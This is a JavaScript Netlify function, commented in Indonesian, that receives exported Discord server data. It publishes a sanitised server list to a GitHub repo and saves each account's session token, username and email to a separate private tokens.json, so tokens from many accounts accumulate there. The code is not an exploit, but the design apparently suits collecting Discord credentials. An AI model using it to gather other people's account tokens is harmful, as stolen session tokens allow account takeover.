// netlify/functions/export.js
// POST https://your-site.netlify.app/.netlify/functions/export
//
// Strategi penyimpanan:
//   data/servers.json  → data publik (tanpa token, tanpa email) — dibaca dashboard
//   data/tokens.json   → token PRIVATE (repo private terpisah, via GITHUB_PRIVATE_REPO env)
//
// Merge logic:
//   - Server lama yang tidak ada di payload baru → TETAP (tidak dihapus)
//   - Server sama (cocok by server_id) → OVERWRITE dengan data baru
//   - Server baru → APPEND

const GITHUB_API = 'https://api.github.com';

// ── Helpers GitHub ────────────────────────────────────────────────────────────

function makeHeaders(token) {
  return {
    'Authorization': `token ${token}`,
    'Content-Type': 'application/json',
    'Accept': 'application/vnd.github.v3+json',
    'User-Agent': 'discord-dashboard-netlify',
  };
}

// Ambil file JSON dari GitHub, return { data, sha } atau { data: null, sha: null }
async function getGitHubFile(owner, repo, branch, path, ghToken) {
  try {
    const res = await fetch(
      `${GITHUB_API}/repos/${owner}/${repo}/contents/${path}?ref=${branch}&t=${Date.now()}`,
      { headers: makeHeaders(ghToken) }
    );
    if (!res.ok) return { data: null, sha: null };
    const file = await res.json();
    const raw  = Buffer.from(file.content, 'base64').toString('utf-8');
    return { data: JSON.parse(raw), sha: file.sha };
  } catch (_) {
    return { data: null, sha: null };
  }
}

// Push file JSON ke GitHub (create atau update)
async function putGitHubFile(owner, repo, branch, path, ghToken, data, sha, commitMsg) {
  const content = Buffer.from(JSON.stringify(data, null, 2)).toString('base64');
  const body    = {
    message: commitMsg || `chore: update ${path} ${new Date().toISOString()}`,
    content,
    branch,
    ...(sha ? { sha } : {}),
  };
  const res = await fetch(
    `${GITHUB_API}/repos/${owner}/${repo}/contents/${path}`,
    { method: 'PUT', headers: makeHeaders(ghToken), body: JSON.stringify(body) }
  );
  if (!res.ok) {
    const err = await res.json();
    throw new Error(`GitHub PUT error [${path}]: ${JSON.stringify(err)}`);
  }
  return await res.json();
}

// ── Sanitize payload → data publik (tanpa token/email) ───────────────────────

function buildPublicData(payload) {
  const pub = JSON.parse(JSON.stringify(payload));
  delete pub.token;
  if (pub.account) delete pub.account.email;
  // servers bisa array (GET_SERVERS format) atau object (SCAN format)
  if (Array.isArray(pub.servers)) {
    pub.servers = pub.servers.map(s => {
      const c = { ...s }; delete c.token; return c;
    });
  } else if (pub.servers && typeof pub.servers === 'object') {
    for (const k of Object.keys(pub.servers)) {
      if (pub.servers[k]?.token) delete pub.servers[k].token;
    }
  }
  pub.exported_at = new Date().toISOString();
  return pub;
}

// ── Merge servers: old + new, keyed by server_id ─────────────────────────────
// Mendukung dua format:
//   Array  → [ { id, name, ... }, ... ]       (format GET_SERVERS)
//   Object → { "ServerName": { server_id, ... } } (format SCAN_CHANNELS)

function mergeServers(oldServers, newServers) {
  // Normalisasi ke Map<server_id, object>
  function toMap(servers) {
    const map = new Map();
    if (Array.isArray(servers)) {
      for (const s of servers) {
        if (s?.id) map.set(s.id, s);
      }
    } else if (servers && typeof servers === 'object') {
      for (const [name, s] of Object.entries(servers)) {
        const id = s?.server_id || s?.id;
        if (id) map.set(id, { _name: name, ...s });
      }
    }
    return map;
  }

  const oldMap = toMap(oldServers);
  const newMap = toMap(newServers);

  // Merge: new overwrite old jika server_id sama
  for (const [id, srv] of newMap.entries()) {
    oldMap.set(id, srv);
  }

  // Kembalikan dalam format yang sama dengan input baru
  if (Array.isArray(newServers)) {
    return Array.from(oldMap.values());
  } else {
    // Kembalikan sebagai object dengan key nama server
    const result = {};
    for (const [, srv] of oldMap.entries()) {
      const name = srv._name || srv.name || srv.server_id || srv.id;
      const clean = { ...srv }; delete clean._name;
      result[name] = clean;
    }
    return result;
  }
}

// ── Ekstrak token dari payload → simpan ke tokens.json ───────────────────────

function extractTokenEntry(payload) {
  if (!payload.token) return null;
  return {
    token:       payload.token,
    account_id:  payload.account?.id   || null,
    username:    payload.account?.username || null,
    email:       payload.account?.email   || null,
    exported_at: new Date().toISOString(),
  };
}

// Merge tokens: keyed by account_id, overwrite jika sama
function mergeTokens(oldTokens, newEntry) {
  const arr = Array.isArray(oldTokens) ? [...oldTokens] : [];
  const idx = arr.findIndex(t => t.account_id && t.account_id === newEntry.account_id);
  if (idx >= 0) {
    arr[idx] = newEntry; // update token lama
  } else {
    arr.push(newEntry);  // tambah token baru
  }
  return arr;
}

// ── Main push: servers.json (publik) + tokens.json (private) ─────────────────

async function pushAll(payload) {
  const owner      = process.env.GITHUB_OWNER;
  const repo       = process.env.GITHUB_REPO;
  const branch     = process.env.GITHUB_BRANCH  || 'main';
  const ghToken    = process.env.GITHUB_TOKEN;

  // Repo private untuk token (boleh sama dengan repo publik jika reponya private)
  const privateRepo   = process.env.GITHUB_PRIVATE_REPO   || repo;
  const privateBranch = process.env.GITHUB_PRIVATE_BRANCH || branch;

  const stats = { servers_added: 0, servers_updated: 0, token_saved: false };

  // ── 1. Push servers.json (data publik, tanpa token) ──────────────
  const pubData = buildPublicData(payload);
  const { data: oldPub, sha: pubSha } = await getGitHubFile(owner, repo, branch, 'data/servers.json', ghToken);

  let mergedServers;
  if (oldPub?.servers) {
    const oldMap = toIdMap(oldPub.servers);
    const newMap = toIdMap(pubData.servers);
    stats.servers_added   = [...newMap.keys()].filter(id => !oldMap.has(id)).length;
    stats.servers_updated = [...newMap.keys()].filter(id =>  oldMap.has(id)).length;
    mergedServers = mergeServers(oldPub.servers, pubData.servers);
  } else {
    mergedServers = pubData.servers;
    stats.servers_added = Array.isArray(mergedServers)
      ? mergedServers.length
      : Object.keys(mergedServers).length;
  }

  const finalPub = {
    ...pubData,
    servers: mergedServers,
    total_servers: Array.isArray(mergedServers)
      ? mergedServers.length
      : Object.keys(mergedServers).length,
  };

  await putGitHubFile(
    owner, repo, branch, 'data/servers.json', ghToken, finalPub, pubSha,
    `chore: update servers (${stats.servers_added} baru, ${stats.servers_updated} diperbarui) ${new Date().toISOString()}`
  );

  // ── 2. Push tokens.json (private) ────────────────────────────────
  const tokenEntry = extractTokenEntry(payload);
  if (tokenEntry) {
    try {
      const { data: oldTokens, sha: tokenSha } = await getGitHubFile(
        owner, privateRepo, privateBranch, 'data/tokens.json', ghToken
      );
      const mergedTokens = mergeTokens(oldTokens || [], tokenEntry);
      await putGitHubFile(
        owner, privateRepo, privateBranch, 'data/tokens.json', ghToken,
        mergedTokens, tokenSha,
        `chore: update token ${tokenEntry.username || tokenEntry.account_id} ${new Date().toISOString()}`
      );
      stats.token_saved = true;
    } catch (e) {
      // Jangan gagalkan seluruh request hanya karena token gagal simpan
      console.error('[export fn] token push failed:', e.message);
    }
  }

  return stats;
}

// Helper: buat Map<id, obj> dari servers (array atau object)
function toIdMap(servers) {
  const map = new Map();
  if (Array.isArray(servers)) {
    for (const s of servers) { if (s?.id) map.set(s.id, s); }
  } else if (servers && typeof servers === 'object') {
    for (const s of Object.values(servers)) {
      const id = s?.server_id || s?.id;
      if (id) map.set(id, s);
    }
  }
  return map;
}

// ── Netlify Function Handler ──────────────────────────────────────────────────

exports.handler = async (event) => {
  const corsHeaders = {
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, X-Export-Key',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers: corsHeaders, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers: corsHeaders, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  // Auth
  const exportKey = event.headers['x-export-key'] || event.headers['X-Export-Key'];
  if (!process.env.EXPORT_SECRET_KEY || exportKey !== process.env.EXPORT_SECRET_KEY) {
    return { statusCode: 401, headers: corsHeaders, body: JSON.stringify({ error: 'Unauthorized' }) };
  }

  // Parse body
  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (_) {
    return { statusCode: 400, headers: corsHeaders, body: JSON.stringify({ error: 'Invalid JSON body' }) };
  }

  if (!payload?.servers) {
    return { statusCode: 400, headers: corsHeaders, body: JSON.stringify({ error: 'Missing servers field' }) };
  }

  // Push
  try {
    const stats = await pushAll(payload);
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify({
        success:          true,
        exported_at:      new Date().toISOString(),
        servers_added:    stats.servers_added,
        servers_updated:  stats.servers_updated,
        token_saved:      stats.token_saved,
      }),
    };
  } catch (e) {
    console.error('[export fn error]', e);
    return { statusCode: 500, headers: corsHeaders, body: JSON.stringify({ error: e.message }) };
  }
};
